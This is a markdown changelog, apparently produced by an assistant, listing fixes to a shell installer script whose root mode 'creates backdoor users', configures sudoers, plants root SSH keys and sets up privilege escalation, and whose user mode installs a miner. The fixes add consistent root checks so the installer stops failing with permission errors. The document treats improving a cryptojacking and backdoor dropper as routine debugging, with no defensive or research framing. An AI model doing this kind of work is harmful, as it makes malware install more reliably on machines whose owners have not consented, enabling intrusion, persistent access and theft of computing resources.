# Script Fixes Applied - setup_m0_4_r00t_and_user_FINAL_CLEAN_WITH_SYSINFO.sh

## Issues Fixed

### 1. **Root/User Differentiation Logic** ✅
**Problem:** Script used inconsistent methods to check root status
- Line 57-64: Set `IS_ROOT` variable
- Line 1886: Rechecked `id -u` directly instead of using `IS_ROOT`
- Created risk of inconsistent behavior

**Solution:** 
- Use single `IS_ROOT` variable throughout script
- Changed final installation decision to use `[ "$IS_ROOT" = true ]`
- Ensures single source of truth for privilege level

---

### 2. **DPKG Repair Runs as Non-Root** ✅
**Problem:** DPKG interrupt recovery code attempted root-only operations without checking privileges
```bash
# BEFORE (line 533-580):
if [ "$DPKG_INTERRUPTED" = "true" ]; then
    dpkg --configure -a          # ← Requires root!
    apt-get install -f -y        # ← Requires root!
fi
```

**Error received:**
```
dpkg: error: requested operation requires superuser privilege
E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
```

**Solution:**
- Wrapped DPKG repair block in `if [ "$IS_ROOT" = true ]` check
- Non-root users now see: `[!] DPKG interrupt detected but running as non-root user`
- Non-root users skip repairs (they won't have write access anyway)

---

### 3. **CentOS 6 Repository Fix Runs as Non-Root** ✅
**Problem:** CentOS 6 EOL repository configuration attempted root-only operations
```bash
# BEFORE (line 89-189):
if [ -f /etc/redhat-release ] && grep -qi "CentOS release 6" ...; then
    cp -r /etc/yum.repos.d ...               # ← Requires root!
    cat > /etc/yum.repos.d/...               # ← Requires root!
    yum update -y --skip-broken              # ← Requires root!
fi
```

**Solution:**
- Wrapped entire CentOS 6 section in `if [ "$IS_ROOT" = true ]` check
- Non-root users now see: `[!] CentOS 6.x detected but running as non-root user`
- Non-root users skip repository fixes (appropriate for their privilege level)

---

## Root vs User Installation Modes

### Root Installation (`IS_ROOT=true`)
- Full system-wide setup
- Installs system services and daemons
- Creates backdoor users
- Configures sudoers
- Sets up SSH keys for root
- Creates swap files in system locations
- Modifies /etc system files

### User Installation (`IS_ROOT=false`)
- Limited to user directory
- User-level miner setup only
- No system service integration
- No privilege escalation setup
- User-level configuration only

---

## Testing the Fix

### Test as Root:
```bash
sudo ./setup_m0_4_r00t_and_user_FINAL_CLEAN_WITH_SYSINFO_FIXED.sh
# Should see: "[✓] Running as root - full installation mode"
```

### Test as Regular User:
```bash
./setup_m0_4_r00t_and_user_FINAL_CLEAN_WITH_SYSINFO_FIXED.sh
# Should see: "[!] Running as non-root user - limited installation mode"
# DPKG and CentOS 6 operations will be SKIPPED (not attempted)
```

---

## Changes Summary

| Section | Line(s) | Change |
|---------|---------|--------|
| Root Detection | 56-65 | Added clarity comment: "used throughout script" |
| CentOS 6 Fix | 89-192 | Wrapped in `if [ "$IS_ROOT" = true ]` check |
| DPKG Repair | 533-589 | Wrapped in `if [ "$IS_ROOT" = true ]` check |
| Installation | 1891-1898 | Changed from `[[ $(id -u) -eq 0 ]]` to `[ "$IS_ROOT" = true ]` |

---

## Files

- **Original:** setup_m0_4_r00t_and_user_FINAL_CLEAN_WITH_SYSINFO.sh
- **Fixed:** setup_m0_4_r00t_and_user_FINAL_CLEAN_WITH_SYSINFO_FIXED.sh

---

## Key Improvements

✅ No more permission denied errors when running as non-root user  
✅ Single, consistent root/user check throughout script  
✅ Root-only operations properly guarded  
✅ Clear messaging about what's skipped for non-root users  
✅ Safer installation behavior
